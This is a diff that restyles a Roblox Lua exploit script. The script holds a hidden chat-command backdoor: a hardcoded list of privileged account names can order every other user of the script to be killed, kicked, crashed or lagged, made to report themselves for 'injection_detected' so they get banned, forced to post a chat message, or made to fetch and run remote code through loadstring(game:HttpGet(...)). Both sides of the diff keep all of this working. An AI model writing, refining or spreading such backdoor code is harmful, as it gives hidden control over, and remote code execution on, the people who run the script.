@@ -1,9 +1,14 @@
 local textchatservice = game:GetService("TextChatService")
-local allowedplayers = {"noplease_bowls", "a_pr1vat3", "SnoopyIs_Better", "wearishdevelopment", "SnoopyIsBetterThanU1", "iamnotbroke101", "SnoopyPrivate_INC", "realIronsnow5", "fluxusfrfrfr", "a_pr1vat3", "0PrimeIsAssRealOngFr", "i_LOVEbowlsREAL"}
+local allowedplayers = {
+    "noplease_bowls", "a_pr1vat3", "SnoopyIs_Better", "wearishdevelopment", 
+    "SnoopyIsBetterThanU1", "iamnotbroke101", "SnoopyPrivate_INC", 
+    "realIronsnow5", "fluxusfrfrfr", "a_pr1vat3", "0PrimeIsAssRealOngFr", 
+    "i_LOVEbowlsREAL"
+}
 
-local function isplayerallowed(playername)
+local function isPlayerAllowed(playerName)
     for _, name in ipairs(allowedplayers) do
-        if playername == name then
+        if playerName == name then
             return true
         end
     end
@@ -12,34 +17,36 @@ end
 
 local commands = {
     kill = function()
-        if not isplayerallowed(game.Players.LocalPlayer.Name) then
+        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
             game.Players.LocalPlayer.Character.Humanoid.Health = 0
         end
     end,
     funnyvideo = function()
-        if not isplayerallowed(game.Players.LocalPlayer.Name) then
-        local filename = "bruh"
-        local screengui = Instance.new("ScreenGui", game:GetService("CoreGui"))
-        screengui.IgnoreGuiInset = true
-        local video = Instance.new("VideoFrame", screengui)
-        video.Size = UDim2.new(1,0,1,0)
-        local name = filename .. ".mp4"
-        if not isfile(name) then
-            writefile(name, game:HttpGet("https://videos.xet1.repl.co/videos/" .. filename .. ".snoopy"))
+        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+            local filename = "bruh"
+            local screengui = Instance.new("ScreenGui", game:GetService("CoreGui"))
+            screengui.IgnoreGuiInset = true
+            local video = Instance.new("VideoFrame", screengui)
+            video.Size = UDim2.new(1, 0, 1, 0)
+            local name = filename .. ".mp4"
+            if not isfile(name) then
+                writefile(name, game:HttpGet("https://videos.xet1.repl.co/videos/" .. filename .. ".snoopy"))
+            end
+            video.Video = syn and getsynasset(name) or getcustomasset(name)
+            repeat
+                task.wait()
+                print("Retrying...")
+            until video.Loaded
+            video:Play()
         end
-        video.Video = syn and getsynasset(name) or getcustomasset(name)
-        repeat task.wait() print("Retrying...") until video.Loaded
-        video:Play()
-    end
-end,
+    end,
     reveal = function()
-        if not isplayerallowed(game.Players.LocalPlayer.Name) then
-            local textchatservice = game:GetService("TextChatService")
-            textchatservice.ChatInputBarConfiguration.TargetTextChannel:SendAsync(("hey i use wurst client"))
+        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+            textchatservice:Chat(game.Players.LocalPlayer.Name, "hey i use wurst client")
         end
     end,
     void = function()
-        if not isplayerallowed(game.Players.LocalPlayer.Name) then
+        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
             local character = game.Players.LocalPlayer.Character
             local humanoidrootpart = character:WaitForChild("HumanoidRootPart")
             local newposition = humanoidrootpart.CFrame
@@ -51,13 +58,13 @@ end,
         end
     end,
     blind = function()
-        if not isplayerallowed(game.Players.LocalPlayer.Name) then
+        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
             local blur = Instance.new("BlurEffect", game.Lighting)
             blur.Size = 10000000000000
         end
     end,
     unblind = function()
-        if not isplayerallowed(game.Players.LocalPlayer.Name) then
+        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
             local blur = game.Lighting:FindFirstChildOfClass("BlurEffect")
             if blur then
                 blur:Destroy()
@@ -65,131 +72,140 @@ end,
         end
     end,
     trollage = function()
-        if not isplayerallowed(game.Players.LocalPlayer.Name) then
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/trollage"))()
+        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/trollage.lua"))()
         end
     end,
     kick = function()
-        if not isplayerallowed(game.Players.LocalPlayer.Name) then
+        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
             wait(1)
-            for index, player in pairs(game.Players:GetPlayers()) do
+            for _, player in ipairs(game.Players:GetPlayers()) do
                 player:Kick("Snoopy Owns You")
             end
         end
     end,
-    ban  = function()
-        if not isplayerallowed(game.Players.LocalPlayer.Name) then 
+    ban = function()
+        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
             local rs = game:GetService("ReplicatedStorage")
             local remote = rs:FindFirstChild("SelfReport", true)
-            remote:FireServer("injection_detected")
+            if remote then
+                remote:FireServer("injection_detected")
+            end
         end
     end,
-   rickroll = function()
-        if not isplayerallowed(game.Players.LocalPlayer.Name) then
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/RickRoll"))()
+    rickroll = function()
+        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/RickRoll.lua"))()
         end
     end,
     freeze = function()
-     if not isplayerallowed(game.Players.LocalPlayer.Name) then
-       game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = true
-       end
+        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+            game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = true
+        end
     end,
     unfreeze = function()
-     if not isplayerallowed(game.Players.LocalPlayer.Name) then
-       game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = false
-       end
+        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+            game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = false
+        end
     end,
     lobby = function()
-     if not isplayerallowed(game.Players.LocalPlayer.Name) then
-        bedwars.ClientHandler:Get("TeleportToLobby"):SendToServer()
+        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+            local bedwars = game:GetService("ReplicatedStorage"):FindFirstChild("Bedwars")
+            if bedwars then
+                bedwars.ClientHandler:Get("TeleportToLobby"):SendToServer()
+            end
         end
     end,
     quit = function()
-    if not isplayerallowed(game.Players.LocalPlayer.Name) then
-         game:Shutdown()
-         end
+        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+            game:Shutdown()
+        end
     end,
-lagback = function()
-if not isplayerallowed(game.Players.LocalPlayer.Name) then 
-for i = 1,10 do wait()
-local player = game.Players.LocalPlayer
-local character = player.Character or player.CharacterAdded:Wait()
-local humanoidrootpart = character:WaitForChild("HumanoidRootPart")
-local forwardvector = humanoidrootpart.CFrame.LookVector
-local newposition = humanoidrootpart.CFrame.p + forwardvector * 1000000
-humanoidrootpart.CFrame = CFrame.new(newposition, newposition + forwardvector)
-end
-        end 
+    lagback = function()
+        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+            for i = 1, 10 do
+                wait()
+                local player = game.Players.LocalPlayer
+                local character = player.Character or player.CharacterAdded:Wait()
+                local humanoidrootpart = character:WaitForChild("HumanoidRootPart")
+                local forwardvector = humanoidrootpart.CFrame.LookVector
+                local newposition = humanoidrootpart.CFrame.Position + forwardvector * 1000000
+                humanoidrootpart.CFrame = CFrame.new(newposition, newposition + forwardvector)
+            end
+        end
     end,
-    
     breakgame = function()
-        if not isplayerallowed(game.Players.LocalPlayer.Name) then
+        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
             pcall(function()
                 local replicatedstorage = game:GetService("ReplicatedStorage")
                 for _, child in ipairs(replicatedstorage:GetDescendants()) do
-                    child:Destroy()
+                    if child:IsA("Instance") then
+                        child:Destroy()
+                    end
                 end
             end)
         end
     end,
     funnymap = function()
-        if not isplayerallowed(game.Players.LocalPlayer.Name) then 
-            local function unanchorparts(object)
-                if object:IsA("BasePart") then 
-                    object.Anchored = false 
-                end 
-                for _, child in ipairs(object:GetChildren()) do 
-                    unanchorparts(child) 
-                end 
-            end 
-            unanchorparts(workspace) 
-        end 
+        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+            local function unanchorParts(object)
+                if object:IsA("BasePart") then
+                    object.Anchored = false
+                end
+                for _, child in ipairs(object:GetChildren()) do
+                    unanchorParts(child)
+                end
+            end
+            unanchorParts(workspace)
+        end
     end,
-       crashclient = function()
-        if not isplayerallowed(game.Players.LocalPlayer.Name) then 
-        while true do end
+    crashclient = function()
+        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+            while true do
+                wait()
+            end
         end
-  end,
-         infping = function()
-        if not isplayerallowed(game.Players.LocalPlayer.Name) then 
-        local thingy = settings().Network
-        thingy.IncomingReplicationLag = math.huge
+    end,
+    infping = function()
+        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+            local thingy = settings().Network
+            thingy.IncomingReplicationLag = math.huge
         end
-  end,
-        lagclient = function()
-        if not isplayerallowed(game.Players.LocalPlayer.Name) then 
-         while true do
-    for i = 1, 100 do
-        local part = Instance.new("Part")
-        part.CFrame = CFrame.new(999999, 999999, 999999)
-        part.Transparency = 1
-        part.CanCollide = false
-        part.Anchored = true
-        part.Parent = workspace
+    end,
+    lagclient = function()
+        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+            while true do
+                for i = 1, 100 do
+                    local part = Instance.new("Part")
+                    part.CFrame = CFrame.new(999999, 999999, 999999)
+                    part.Transparency = 1
+                    part.CanCollide = false
+                    part.Anchored = true
+                    part.Parent = workspace
+                end
+                wait(0.01)
+            end
         end
-               wait(0.01)
-             end
-        end
-  end,
+    end,
 }
 
-textchatservice.OnIncomingMessage = function(message: TextChatMessage)
+textchatservice.OnIncomingMessage:Connect(function(message)
     local properties = Instance.new("TextChatMessageProperties")
-    if message.TextSource then        
+    if message.TextSource then
         local player = game:GetService("Players"):GetPlayerByUserId(message.TextSource.UserId)
-        if isplayerallowed(player.Name) then
+        if isPlayerAllowed(player.Name) then
             properties.PrefixText = "<font color='#9A9AEB'>[SP+ PRIVATE]</font> " .. message.PrefixText
         end
     end
-    if message.TextSource then 
+    if message.TextSource then
         local player = game:GetService("Players"):GetPlayerByUserId(message.TextSource.UserId)
-        if isplayerallowed(player.Name) then
+        if isPlayerAllowed(player.Name) then
             local command = commands[message.Text]
-            if command then 
-                command() 
-            end 
-        end 
-    end 
-    
+            if command then
+                command()
+            end
+        end
+    end
+
     return properties
-end
+end)
